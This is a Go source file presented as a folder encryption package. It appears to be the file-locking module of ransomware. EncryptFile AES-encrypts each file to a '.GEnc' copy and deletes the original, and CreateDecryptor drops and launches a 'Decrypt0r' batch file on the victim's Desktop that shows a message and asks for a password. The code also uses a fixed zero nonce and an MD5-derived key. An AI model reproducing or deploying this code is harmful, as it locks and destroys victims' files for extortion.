/*
   This package allows you to encrypt
   and decrypt files in folders.
*/

package files_encryption

import (
	"os"
	"fmt"
	"strings"
	"os/exec"
	"io/ioutil"
	"path/filepath"
	"encoding/base64"
	"encoding/hex"
	"crypto/cipher"
	"crypto/aes"
	"crypto/md5"
	i "../system"
)

// Check
func check(e error) {
    if e != nil {
        fmt.Println(e)
    }
}

// Create hash
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

// Encrypt file by password
func EncryptFile(file string, passphrase string) string {
	if _, err := os.Stat(file); os.IsNotExist(err) {
		fmt.Println("[FAILED] Encrypt file " + file + " not found!")
		return ""
	}
	read,  _ := ioutil.ReadFile(file)
	data     := base64.StdEncoding.EncodeToString([]byte(read))
	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
	gcm, err := cipher.NewGCM(block)
	check(err)
	nonce    := make([]byte, gcm.NonceSize())
	check(err)
	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
	ioutil.WriteFile(file + ".GEnc", ciphertext, 0644)
	os.Remove(file)
	fmt.Println("[SUCCESS] Encrypted file " + file)
	return file + ".GEnc"
}

// Decrypt file by password
func DecryptFile(file string, passphrase string) string {
	if _, err := os.Stat(file); os.IsNotExist(err) {
		fmt.Println("[FAILED] Decrypt file " + file + " not found!")
		return ""
	}
	data, _ := ioutil.ReadFile(file)
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	check(err)
	gcm, err := cipher.NewGCM(block)
	check(err)
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	check(err)
	plaintext, _   = base64.StdEncoding.DecodeString(string(plaintext))
	ioutil.WriteFile( strings.Replace(file, ".GEnc", "", -1), plaintext, 0644)
	os.Remove(file)
	fmt.Println("[SUCCESS] Decrypted file " + file)
	return strings.Replace(file, ".GEnc", "", -1)
}

// Create 'decryptor.bat' file
func CreateDecryptor(message string) {
	dir, file := filepath.Split( i.ExecutableLocation() )
	ioutil.WriteFile(i.GetUserDir() + "\\Desktop\\decryptor.bat", []byte("@echo off \ncolor E \ntitle Decrypt0r \necho " + message + " \nset /p password=\"Enter password: \" \ncd " + dir + " \nstart " + file + " --decrypt %password% \nexit"), 0644)
    exec.Command("cmd.exe", "/C start " + i.GetUserDir() + "\\Desktop\\decryptor.bat").Run()
}

// Delete decryptor.bat' file
func DeleteDecryptor() {
	os.Remove(i.GetUserDir() + "\\Desktop\\decryptor.bat")	
}